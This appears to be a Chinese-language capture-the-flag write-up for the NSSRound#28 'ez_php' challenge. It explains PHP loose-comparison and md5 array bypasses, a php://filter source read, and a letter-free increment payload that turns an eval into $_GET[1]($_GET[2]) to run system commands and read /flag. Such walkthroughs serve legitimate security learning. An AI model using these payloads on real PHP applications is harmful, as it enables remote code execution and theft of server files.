<p>NSSRound#28 Team  ez_php</p>
<p><img src="/../picture/image-20250324174908926.png" alt="image-20250324174908926"></p>
<p>先看代码呗</p>
<p>post传参  a b  get传参 pssword</p>
<p>password不能是纯数字   又要等于123456</p>
<p>is_numeric检验password是不是数字  如果是数字就会执行第一个die</p>
<p>password!&#x3D;123456  是非严格比较</p>
<p>PHP 进行 <strong>非严格比较</strong> (<code>!=</code>) 时，会尝试将字符串转换成数字。如果字符串以数字开头，PHP 会尽可能解析成数字，<code>&quot;123456abc&quot;</code> 会被当作 <code>123456</code> 来比较</p>
<p>所以这里我们可以通过传password&#x3D;123456abc进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($a != $b &amp;&amp; md5($a) === md5($b))</span><br></pre></td></tr></table></figure>

<p>a!&#x3D;b   a的md5还要等于b的md5</p>
<p>因为md5对数组加密结果为NULL  所以这里直接用数组绕过</p>
<p>post传参 a[]&#x3D;1&amp;b[]&#x3D;2即可绕过</p>
<p>接下来就是文件包含inclue</p>
<p>直接利用php:&#x2F;&#x2F;filte文件读取流读取level2.php</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;level2.php</p>
<p><img src="/../picture/image-20250324174908926.png" alt="image-20250324180751750"></p>
<p>base64解码</p>
<p><img src="/../picture/image-20250324174908926.png" alt="image-20250324180901179"></p>
<?php
error_reporting(0);
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            if (!preg_match("/[!@#%^&*:'\-<?><p>&quot;/|&#96;a-zA-Z~\\]&#x2F;“, $rce)) {<br>                eval($rce);<br>            } else {<br>                echo(“Are you hack me?”);<br>            }<br>        } else {<br>            echo “I want string!”;<br>        }<br>    } else {<br>        echo “too long!”;<br>    }<br>}<br>?&gt;</p>
<p>然后要去访问&#x2F;level2.php网页里传参  不要在原网页里直接传参  因为他没有对level2.php进行文件包含</p>
<p>这里就是无字母 无  [!@#%^&amp;*:’-&lt;?&gt;&quot;/  传参了  可以使用数字</p>
<p>也限制了长度&lt;120</p>
<p>这里通过自增绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rce=<span class="variable">$_</span>=[]._;<span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="variable">$_</span>++;<span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$_1</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>;<span class="variable">$_</span>=_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$_</span>(<span class="number">69</span>).<span class="variable">$_</span>(<span class="number">84</span>);<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[1]($_GET[2])</span><br></pre></td></tr></table></figure>

<p>然后再get传参  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system&amp;2=ls / </span><br></pre></td></tr></table></figure>

<p> 列出根目录  再cat &#x2F;flag</p>
<p><img src="/../picture/image-20250324174908926.png" alt="image-20250324185833504"></p>
